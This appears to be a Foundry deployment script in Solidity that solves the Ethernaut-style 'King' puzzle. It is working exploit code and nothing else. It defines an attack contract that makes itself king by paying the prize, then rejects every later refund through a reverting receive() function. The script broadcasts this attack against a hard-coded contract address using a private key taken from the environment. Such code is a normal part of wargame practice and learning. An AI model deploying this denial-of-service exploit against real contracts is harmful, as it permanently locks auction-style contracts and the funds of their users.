// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";
import {Script} from "forge-std/Script.sol";

contract AttackContract {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(King _king) public payable {
       (bool success,) = address(payable(_king)).call{value: msg.value}("");

        require(success, "Failed");
    }

    receive() external payable {
        if (msg.sender != owner) {
            revert();
        }
    }
}

contract KingAttack is Script {
    King public king = King(payable(0xfDFF13294021FdBD3F70f6d655e47764D8dB4623));
    
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackContract attackContract = new AttackContract();

        attackContract.attack{value: king.prize()}(king);

        vm.stopBroadcast();
    }
}